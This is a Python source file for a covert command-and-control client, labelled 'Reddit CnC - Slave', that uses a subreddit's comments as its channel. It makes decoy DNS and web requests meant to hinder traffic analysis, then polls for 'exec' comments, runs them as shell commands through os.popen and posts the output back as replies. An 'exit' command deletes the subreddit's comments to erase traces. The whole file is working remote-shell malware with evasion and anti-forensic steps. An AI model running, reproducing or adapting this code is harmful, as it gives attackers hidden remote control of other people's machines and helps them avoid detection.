import praw
import sys
import time
import os
import dns.resolver
import requests
import argparse

# Connectivity check to check if there is an active internet connection
def connectivity_check():
    # Set a variable to store the boolean used to determine if an active connection was observed
    check = False

    # Specify which DNS servers to use to make the DNS query, set timeout to 5 seconds
    myResolver = dns.resolver.Resolver()
    myResolver.lifetime = 5.0
    myResolver.nameservers = ['8.8.8.8', '8.8.4.4']

    # Perform a DNS query as diversion, sleep for 2 seconds and perform a GET request to https://reddit.com, sleep for 1 second
    try:
        print("[+] Making DNS request to reddit.com")
        dns_answer = []
        dns_query = myResolver.query('reddit.com', 'A')
        for rdata in dns_query:
            dns_answer.append(rdata)
        # Generate some noise as part of making analysis of the traffic harder
        if rdata is not None:
            check = True
            time.sleep(2)
            print("[+] Active network connection observed!")
            print("[+] Making fake GET request to https://reddit.com")
            fake_req_https = requests.get('https://reddit.com')
            time.sleep(1)
        else:
            print("[!] No network connection, exiting...")
            exit(0)
    # Terminate the Python script when no connection is received after performing above checks
    except:
        print("[!] An error occurred performing the connectivity check, exiting...")
        exit(0)

    # Return the value of check
    return check

# Function to log into the reddit account
def login(username, password, client_id, client_secret):
    reddit = praw.Reddit(username = username,
                    password = password,
                    client_id = client_id,
                    client_secret = client_secret,
                    user_agent = "Reddit CnC - Slave")
    return reddit

# Function to check if the CnC is ready
def check_start(reddit, subreddit):

    check = False 
    # Set the subreddit to use as CnC
    subreddit = reddit.subreddit(subreddit)
    print("[+] Checking for start command")
    for comment in subreddit.stream.comments():
        if "start" in comment.body:
            comment.reply("ready")
            check = True
            break
    return check

# Look for new commands to execute
def command(reddit, parsed_comments_list, subreddit):

    # Set the subreddit to use as CnC
    subreddit = reddit.subreddit(subreddit)

    # Loop over the comments found in the subreddit
    for comment in subreddit.stream.comments():
        
        # If the "exec" keyword is found, execute the commands
        if "exec" in comment.body and comment.id not in parsed_comments_list:
            print("[+] Received {0} command".format(str(comment.body).replace("exec ", "")))
            command = str(comment.body).replace("exec ", "")
            print("[+] Waiting for next command...")
            # Delete the comments if the exit command is received
            if command == "exit":
                print("[+] Deleting comments...")
                for comment in subreddit.comments():
                    comment.delete()
                print("[+] Exiting...")
                sys.exit(0)
            # Execute the commands parsed from the Reddit comments, prepend "result"
            else:
                execute_command = os.popen(command).read()
                comment.reply("result " + execute_command)
                # Append the comment ID of the parsed comments as to not execute commands twice
                parsed_comments_list.append(comment.id)
    #time.sleep(2)

# Keep track of the comment ID's that are already parsed
def parsed_comments():
    parsed_comments_list = []
    return parsed_comments_list


if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument('--username', help='reddit account to use', dest='username', required=True)
    parser.add_argument('--password', help='password for the reddit account', dest='password', required=True)
    parser.add_argument('--client-id', help='reddit account client id', dest='client_id', required=True)
    parser.add_argument('--client-secret', help='reddit account secret', dest='client_secret', required=True)
    parser.add_argument('--subreddit', help='subreddit to use', dest='subreddit', required=True)
    parser.add_argument('--comment-id', help='comment id to use', dest='comment_id', required=True)

    args = parser.parse_args()

    print("[+] Performing connectivity check...")
    connectivity = connectivity_check()

    print("[+] Starting Reddit login procedure")
    reddit_login = login(args.username, args.password, args.client_id, args.client_secret)

    print("[+] Checking for CnC start command")
    cnc_check = check_start(reddit_login, args.subreddit)

    # Execute the script if the Reddit login was successful
    if (bool(reddit_login) and bool(cnc_check)) is True:
        print("[+] Reddit login successful")
        print("[+] CnC start command found!")
        print("[+] Starting Reddit CnC shell")
        # Instantiate the list to track the comment ID's
        parsed_reddit_comments = parsed_comments()
        while True:
            command(reddit_login, parsed_reddit_comments, args.subreddit)
    else:
        print("[+] Failed to login")
        print("[+] Exiting...")
        sys.exit(0)